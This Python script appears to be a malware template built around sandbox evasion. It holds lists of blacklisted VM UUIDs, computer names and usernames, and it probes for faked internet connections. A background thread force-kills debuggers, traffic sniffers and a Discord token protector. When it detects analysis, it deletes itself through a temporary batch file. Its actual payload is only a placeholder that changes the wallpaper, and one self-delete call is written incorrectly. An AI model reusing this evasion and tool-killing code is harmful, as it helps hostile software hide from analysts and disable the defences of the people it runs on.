import os,sys,subprocess
import threading,time
import platform,logging
import random, string
import requests, ctypes
from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3

logging.basicConfig(level=logging.INFO)

Debug = False

if not Debug:
    logging.disable(logging.CRITICAL)

class Anti_VM:
    BLACKLISTED_UUIDS = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250', '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C', '9961A120-E691-4FFE-B67B-F0E4115D5919')
    BLACKLISTED_COMPUTERNAMES = ('00900BC83803', '00900BC83804','bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS')
    BLACKLISTED_USERS = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
    BLACKLISTED_TASKS = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector')

    @staticmethod
    def check_uuid() -> bool: # checks uuids
        logging.info("Checking UUID")
        # uuid = subprocess.run('wmic csproduct get uuid', shell=True, capture_output=True).stdout.splitlines()[2].decode(errors='ignore').strip()
        uuid = subprocess.run("wmic csproduct get uuid", shell=True, capture_output=True).stdout.splitlines()[2].decode(errors='ignore').strip()
        return uuid in Anti_VM.BLACKLISTED_UUIDS
    
    @staticmethod
    def check_computername() -> bool: # checks computername
        logging.info("Checking Computer-name...")
        computer_name = os.getenv('computername')
        return computer_name.lower() in Anti_VM.BLACKLISTED_COMPUTERNAMES
    
    @staticmethod
    def check_username() -> bool: # checking usernames uwu
        logging.info("Checking Username")
        username = os.getlogin()
        return username.lower() in Anti_VM.BLACKLISTED_USERS
    
    @staticmethod
    def checkhttpsimulation() -> bool: # checks if it simulates internet connections
        logging.info("Checking if in http simulation")
        http = PoolManager(cert_reqs='CERT_NONE', timeout=1.0)
        try:
            http.request("GET", f'https://blank-{Utility.GetRandomString()}.in')
        except Exception:
            return False
        else:
            return True
        
    @staticmethod
    def killTasks() -> None: # kills all Blacklisted applications
        Utility.TaskKill(*Anti_VM.BLACKLISTED_TASKS)

    @staticmethod
    def isVM() -> bool:
        logging.info('Checking if system is a VM')
        threading.Thread(target=Anti_VM.killTasks, daemon=True).start()
        result = Anti_VM.checkhttpsimulation() or Anti_VM.check_uuid() or Anti_VM.check_computername() or Anti_VM.check_username()# or Anti_VM.checkHosting() or Anti_VM.checkRegistry()
        if result:
            logging.info('System is a VM')
        else:
            logging.info('System is not a VM')
        return result
    

class Utility:
    
    @staticmethod
    def GetRandomString(length=8):
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choices(chars, k=length))
    
    @staticmethod
    def TaskKill(*tasks: str) -> None:
        tasks = list(map(lambda x: x.lower(), tasks))
        out = subprocess.run('tasklist /FO LIST', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().split('\r\n\r\n')
        for i in out:
            i = i.split('\r\n')[:2]
            try:
                name, pid = (i[0].split()[-1], int(i[1].split()[-1]))
                name = name[:-4] if name.endswith('.exe') else name
                if name.lower() in tasks:
                    subprocess.run('taskkill /F /PID %d' % pid, shell=True, capture_output=True)
            except Exception:
                pass

class Main_payload:
    import tempfile

    def __init__(self):
        self.payload_dir = os.path.abspath(__file__)
        self.tempdir = Main_payload.tempfile.gettempdir()

    @staticmethod
    def main():
        image_path = os.path.abspath("wallpaper.jpg")  # Or use .png
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
        return
    
    def self_delete(self): # deleting itself after execution, i have another idea of encrypting the exe file before deleting
        if Debug:
            logging.debug("debug mode is on... skipping...")
            return 0
        
        bat_script = f"""
        @echo off
        timeout /t 3 > NUL
        del "{self.payload_dir}" > NUL
        del %0
        """
        bat_name = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8)) + ".bat"
        abs_path_tmp = os.path.join(self.tempdir, bat_name) # rename the bat file into something random! like bruh?

        Error = True
        while Error:
            try:
                with open(abs_path_tmp, "w") as f:
                    f.write(bat_script)
                subprocess.Popen(abs_path_tmp, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
                Error = False
                break

            except Exception:
                continue

        return


if __name__ == '__main__':
    if Anti_VM.isVM():
        print("ITS A VM! SCRAM!!\n"*100)
        Main_payload.self_delete()
        sys.exit()

    else:
        print("Nah we good we just chill *smokes*\n")
        Main_payload.main()
        pass
